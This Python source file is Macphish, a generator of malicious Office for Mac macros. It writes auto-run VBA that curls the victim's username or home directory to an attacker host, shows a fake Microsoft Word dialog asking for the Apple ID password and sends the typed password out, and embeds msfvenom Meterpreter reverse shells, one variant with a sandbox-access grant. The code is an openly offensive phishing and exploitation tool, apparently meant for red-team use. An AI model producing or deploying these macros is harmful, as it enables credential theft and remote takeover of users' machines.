#!/usr/bin/python
###############################################################################
#MIT License
#
#Copyright (c) 2017 Paulino Calderon Pale
#
#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.
###############################################################################
# Macphish (https://github.com/cldrn/macphish/)
# Version: 1BETA-DRAGONJARCON
# Author: Paulino Calderon <calderon@websec.mx>
#
# Macphish - Office for Mac Macro Payload Generator
#
# Usage: ./macphish -h
#
# Attack modes:
# * beacon: Phone home beacon 
# * creds: Credential phishing with osascript
# * meterpreter: Meterpreter
# * meterpreter-grant: Meterpreter with GrantAccessToMultipleFiles()
#

import argparse
import sys
import os
import getopt
import logging
import subprocess
import distutils.spawn
from random import choice
from string import ascii_letters

NAME = "MacPhish"
VERSION = "1BETA-DRAGONJARCON"
URL = "https://github.com/cldrn/macphish"
AUTHOR = "Paulino Calderon <paulino@websec.mx>"
MACPHISH_LOG = "macphish.log"

def banner():
  banner = """
               MACPHISH
           MACPHISHMACPHISH               
       MACPHISHMACPHISHMACPHI           S
    HMAC   PHISHMACPHISHMACPHIS        HM $$\      $$\                     $$$$$$$\  $$\       $$\           $$\ 
  ACPHIS   HMACPHISHMACPHISHMACP     HISH $$$\    $$$ |                    $$  __$$\ $$ |      \__|          $$ |   
MACPHISHMACPHISHMACPHISHMACPHISHM   ACPHI $$$$\  $$$$ | $$$$$$\   $$$$$$$\ $$ |  $$ |$$$$$$$\  $$\  $$$$$$$\ $$$$$$$\  
  MACPHISHMACPHISHMACPHISHMACPHISHMACPHIS $$\$$\$$ $$ | \____$$\ $$  _____|$$$$$$$  |$$  __$$\ $$ |$$  _____|$$  __$$\ 
      HMACPHISHMACPHISHMACPHISHMACPHISHMA $$ \$$$  $$ | $$$$$$$ |$$ /      $$  ____/ $$ |  $$ |$$ |\$$$$$$\  $$ |  $$ |
  CPHISHMACPHISHMACPHISHMACPHISHMACPHISHM $$ |\$  /$$ |$$  __$$ |$$ |      $$ |      $$ |  $$ |$$ | \____$$\ $$ |  $$ |
ACPHISHMACPHISHMACPHISHMACPHISHMAC PHISHM $$ | \_/ $$ |\$$$$$$$ |\$$$$$$$\ $$ |      $$ |  $$ |$$ |$$$$$$$  |$$ |  $$ |
  ACPHISHMACPHISHMACPHISHMACPHISH    MACP \__|     \__| \_______| \_______|\__|      \__|  \__|\__|\_______/ \__|  \__|
    HISHMACPHISHMACPHISHMACPHISH       MA
       CPHISHMACPHISHMACPHISH           M  %s (%s)
         ACPHISHMACPHISHMAC                Mac macro payload generator (%s)
           PHISHMACPHISH                   Author: %s
              MACPHISH
""" % (NAME, VERSION, URL, AUTHOR)
  return banner

def find_msfvenom():
    if os.name == "nt":
        msfvenom_path = distutils.spawn.find_executable("msfvenom.exe", os.environ["PROGRAMFILES(X86)"]+"\Metasploit")
        if not(msfvenom_path):
            msfvenom_path = distutils.spawn.find_executable("msfvenom.exe", os.environ["PROGRAMFILES"]+"\Metasploit")
    else:
        msfvenom_path = distutils.spawn.find_executable("msfvenom","/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin")

    return msfvenom_path

def random_name():
  rnd = ''.join(choice(ascii_letters) for i in range(12))
  return rnd

def gen_beacon_template(lhost, random=False):
  if not random:
    macro = """
Sub AutoOpen()
#If Mac Then
  i = MacScript("return short user name of (system info)")
  MacScript ("do shell script ""curl http://%s/" & i & "\"\"")
#Else
  ' Enter your Windows macro here!
#End If
End Sub
""" % (lhost)
  else:
    rnd = random_name()
    macro = """
Sub AutoOpen()
#If Mac Then
  %s
#Else
  ' Enter your Windows macro here!
#End If
End Sub

Sub %s()
i = MacScript("return home directory of (system info)")
MacScript("do shell script ""curl http://%s/" & i & "\"\"")
End Sub
""" % (rnd, rnd, lhost)
  return macro

def gen_macro(payload, random, prefix=''):
  if random:
    rnd = random_name()
    macro = """
Sub AutoOpen()
#If Mac Then
  %s
#Else
  ' Enter your Windows macro here!
#End If
End Sub
Sub %s()
%s
MacScript("%s")
End Sub
""" % (rnd, rnd, prefix, payload)
  else:
    macro = """
Sub AutoOpen()
#If Mac Then
  %s
  MacScript("%s")
#Else
  ' Enter your Windows macro here!
#End If
End Sub
""" % (prefix, payload)
  return macro

def meterpreter_payload(lhost, lport, payload, options):
  logging.info("Generating payload with msfvenom: %s (%s) %s:%s", lhost, lport, payload, options)
  path = find_msfvenom()
  if not path:
    print "Can't find msfvenom. Exiting..."
    exit()

  outfile = "%s_%s_%s.py" % (lhost, lport, payload.replace("/", "-"))
  cmd = "%s -p %s -f raw LHOST=%s LPORT=%s -o %s" % (path, payload, lhost, lport, outfile)
  logging.debug(cmd)
  proc = subprocess.Popen(cmd.split(), shell=False)
  proc.wait()

  payload_file = open(outfile, 'r') 
  payload = payload_file.read()
  payload_file.close()

  logging.debug(payload)
  return payload

def beacon_template(payload, payload2, random):
  if random:
    rnd = random_name()
    macro = """
Sub AutoOpen()
#If Mac Then
  %s
#Else
  ' Enter your Windows macro here!
#End If
End Sub

Sub %s()
t=MacScript("%s")
TestArray = Split(t)
pass = TestArray(3)
pass = Split(pass, ":")
user = MacScript("return short user name of (system info)")
leak = MacScript("%s & user & "/" & pass(1) & "\"\"")
End Sub
""" % (rnd, rnd, payload, payload2)
  else:
    macro = """
Sub AutoOpen()
#If Mac Then
  t=MacScript("%s")
  TestArray = Split(t)
  pass = TestArray(3)
  pass = Split(pass, ":")
  user = MacScript("return short user name of (system info)")
  leak = MacScript("%s & user & "/" & pass(1) & "\"\"")
#Else
  ' Enter your Windows macro here!
#End If
End Sub
""" % (payload, payload2)
  return macro

def write_macro(filename, content):
  logging.debug("Saving macro to file %s" % filename)
  fp = open(filename, "w")
  fp.write(content)
  fp.close()

def macscript(payload, macro, rnd):
  logging.debug("Generating macscript command-> payload:%s macro:%s random name:%s" % (payload, macro, rnd))
  str = "do shell script \"%s\"" % (payload)
  if macro:
    str = escape_vba(str)
    str = gen_macro(str, rnd)
  logging.debug("Macscript command: %s" % str )
  return str


def gen_beacon(lhost, macro, random):
  logging.debug("Generating beacon-> lhost:%s Generate macro:%s Random name:%s" % (lhost, macro, random))
  payload = ""
  if lhost:
    payload = "curl http://%s/" % (lhost)
    logging.debug("Setting payload to '%s'" % payload)
  else:
    logging.debug("No lhost defined")
    return False
  return macscript(payload, macro, random)

def gen_exfil_cmd():
  str = ""
  return cmd

def gen_osascript_dialog(msg, title, icon):
  cmd = "/usr/bin/osascript -e 'display dialog \"%s\" & return & return default answer \"\" with icon %s with hidden answer with title \"%s\"'" % (msg, icon, title)
  cmd = escape_macscript(cmd)

  return cmd

def gen_dialog_payload(lhost, macro, random, custom_msg = None, custom_title = None, custom_icon = None):
  logging.debug("Generating dialog phishing attack-> lhost:%s Generate macro:%s Random name:%s" % (lhost, macro, random))
  if custom_msg:
    msg = custom_msg
  else:
    msg = "Microsoft Word needs your Apple ID password to decrypt this secure file"

  if custom_title:
    title = custom_title
  else:
    title = "Microsoft Word"
  
  if custom_icon:
    icon = custom_icon
  else:
    icon = "caution"

  str = "do shell script \"%s\"" % gen_osascript_dialog(msg, title, icon)
  str2 = gen_beacon(lhost, False, False)
  str2 = escape_vba(str2[:-1])
  str2 = str2 + "\""
  if macro:
    #log.debug("generating macro")
    str = escape_vba(str)
    str = beacon_template(str, str2, random)
  return str

def gen_meterpreter(lhost, lport, payload, opts, macro, random):
  logging.info("Generating meterpreter payload for %s:%s", lhost, lport)
  meterpreter = meterpreter_payload(lhost, lport, payload, opts)
  python_payload = "\"%s\"" % meterpreter
  python_payload = escape_macscript(python_payload)
  str = "do shell script \"python -c %s &> /dev/null \"" % python_payload
 
  if macro:
    str = escape_vba(str)
    str = gen_macro(str, random)
    out = lhost + "_" + lport + "_" + "_" + payload.replace("/", "-") + ".macro" 
    print "Saved macro as:%s" % out
    write_macro(out, str)
  return str

def gen_grantaccesstomultiplefiles(lhost, lport, payload, opts, random):
  logging.info("Generating meterpreter with GrantAccessToMultipleFiles() for %s:%s", lhost, lport)
  meterpreter = meterpreter_payload(lhost, lport, payload, opts)
  python_payload = "\"%s\"" % meterpreter
  python_payload = escape_macscript(python_payload)
  str = "do shell script \"python -c %s &> /dev/null \"" % python_payload

  user_gen =  """
#If MAC_OFFICE_VERSION >= 15 Then
  a = MacScript("return short user name of (system info)")
  GrantAccessToMultipleFiles(Array("/Users/" & a & "/Documents/"))
#End If
""" 
  grant = ""
  
  str = escape_vba(str)
  str = gen_macro(str, random, user_gen)
  out = lhost + "_" + lport + "_" + "_" + payload.replace("/", "-") + ".macro" 
  print "Saved macro as:%s" % out
  write_macro(out, str)
  return str

#Transforms '"' into '""' (VBA escaping)
def escape_vba(str):
  str = str.replace('"', '""')
  return str

#Transforms '"' into '\"' (Macscript escaping)
def escape_macscript(str):
  str = str.replace('"', '\\"')
  return str

def main():
  print(banner())
  parser = argparse.ArgumentParser(description="Macscript payload generator")
  parser.add_argument("-d", "--debug", action="store_true", dest="debug", 
                  help="Enable debugging")
  parser.add_argument("-r", "--random-name", action="store_true", dest="random", default=False, help="Use random function name")
  parser.add_argument("-m", "--macro", action="store_true", dest="macro", help="Generate office macro")
  parser.add_argument("-a", "--attack", dest="mode", default="beacon", help="Attack type: beacon, creds, meterpreter, meterpreter-grant")
  parser.add_argument("-lh", "--lhost", dest="lhost", help="lhost: Listening host", required=True)
  parser.add_argument("-lp", "--lport", dest="lport", help="lport: Listening port", required=False)
  parser.add_argument("-opts", "--meterpreter-options", dest="opts", help="Meterpreter opts")
  parser.add_argument("-p", "--payload", dest="payload", help="Meterpreter payload type")
  parser.add_argument("-t", "--creds-title", dest="title", help="Title used in creds phishing dialog")
  parser.add_argument("-msg", "--creds-msg", dest="msg", help="Message used in creds phishing dialog")
  parser.add_argument("-i", "--creds-icon", dest="icon", help="Icon used in creds phishing dialog")

  if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)

  args = parser.parse_args()
  
  if args.debug:
    logging.basicConfig(filename='macphish.log', level=logging.DEBUG)
    logging.info("macphish running in verbose mode.")
  if args.mode:
    logging.info("payload type:%s" % args.mode)
    if args.mode == "beacon":
      print gen_beacon_template(args.lhost, args.random)
    elif args.mode == "creds":
      print gen_dialog_payload(args.lhost, args.macro, args.random, args.title, args.msg, args.icon)
    elif args.mode == "meterpreter":
      if args.payload:
        print gen_meterpreter(args.lhost, args.lport, args.payload, args.opts, args.macro, args.random)
      else:
        print "This attack mode requires the payload type (-p). Ex. -p python/meterpreter/reverse_https"
        sys.exit(1)
    elif args.mode == "meterpreter-grant":
      if args.payload:
        print gen_grantaccesstomultiplefiles(args.lhost, args.lport, args.payload, args.opts, args.random)
      else:
        print "This attack mode requires a payload type (-p). Ex: -p python/meterpreter/reverse_https"
        sys.exit(1)
    else:
      parser.print_help()
      sys.exit(1)
if __name__ == "__main__":main()
